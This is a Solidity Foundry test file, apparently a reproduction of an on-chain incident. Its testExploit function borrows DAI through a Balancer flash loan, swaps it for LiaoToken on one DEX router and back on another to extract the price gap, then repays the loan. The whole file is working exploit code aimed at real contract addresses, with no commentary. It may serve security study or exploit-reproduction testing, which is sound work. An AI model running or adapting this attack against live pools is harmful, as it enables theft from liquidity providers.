// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {SashaV2BaseTest} from "./SashaV2Base.t.sol";

import "../../src/interface.sol";

// import {IVault} from "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
// import {IFlashLoanRecipient} from "@balancer-labs/v2-interfaces/contracts/vault/IFlashLoanRecipient.sol";

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract SashaV2Test is SashaV2BaseTest, IFlashLoanRecipient {
    IVault private vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function testExploit() public validation {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(DAI);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 3 ether;

        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(vault), "Only Balancer Vault can call this function");
        
        ERC20(DAI).approve(address(UniRouter), type(uint256).max);
        ERC20(DAI).approve(address(PankcakeRouter), type(uint256).max);
        ERC20(LiaoToken).approve(address(UniRouter), type(uint256).max);
        ERC20(LiaoToken).approve(address(PankcakeRouter), type(uint256).max);

        address[] memory pathUni = new address[](2);
        pathUni[0] = DAI;
        pathUni[1] = LiaoToken;

        UniRouter.swapExactTokensForTokens(
            amounts[0],
            0,
            pathUni,
            address(this),
            block.timestamp
        );

        address[] memory pathPan = new address[](2);
        pathPan[0] = LiaoToken;
        pathPan[1] = DAI;
        
        PankcakeRouter.swapExactTokensForTokens(
            ERC20(LiaoToken).balanceOf(address(this)),
            0,
            pathPan,
            address(this),
            block.timestamp
        );

        ERC20(DAI).transfer(address(vault), amounts[0]);
    }
}
